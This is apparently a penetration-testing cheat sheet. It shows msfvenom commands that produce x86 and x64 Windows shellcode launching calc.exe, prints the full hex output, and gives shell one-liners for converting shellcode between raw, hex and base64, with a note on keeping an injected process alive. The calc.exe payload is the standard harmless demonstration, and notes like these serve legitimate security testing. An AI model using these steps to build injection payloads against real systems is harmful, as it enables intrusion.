## Generating shellcode quickly
MSFVenom is very handy when it comes to generating shellcode.

For example, to generate a raw shellcode which spawns a `calc.exe` process and print it as a hex string:

+ x86
```cli
msfvenom -p windows/exec CMD="calc.exe" EXITFUNC=thread | xxd -ps | tr -d '\n'
fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6a018d85b20000005068318b6f87ffd5bbe01d2a0a68a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5636d642e657865202f432063616c632e65786500
```

+ x64
```cli
msfvenom -p windows/x64/exec CMD="calc.exe" EXITFUNC=thread | xxd -ps | tr -d '\n'
fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba01000000000000488d8d0101000041ba318b6f87ffd5bbe01d2a0a41baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500
```

> Specify `EXITFUNC=thread` to avoid exiting the injected process when the shellcode returns.

## Bash-fu
+ Convert a hex string to a binary file:
```cli
echo -ne "505152..." | xxd -r -p > sc.raw
```
```cli
 echo -ne "\x50\x51\x52..." | xxd -r -p > sc.raw
```

+ Encode a raw file in base64:
```cli
cat ./sc.raw | base64 -w 0
```

+ Convert a raw file to hex:
```cli
 cat ./sc.raw | xxd -ps | tr -d ' \n'
```

+ Remove a trailing `\n`:
```cli
 cat ./sc.raw | tr -d '\n'
```
```cli
 head -c -1 ./sc.raw
```

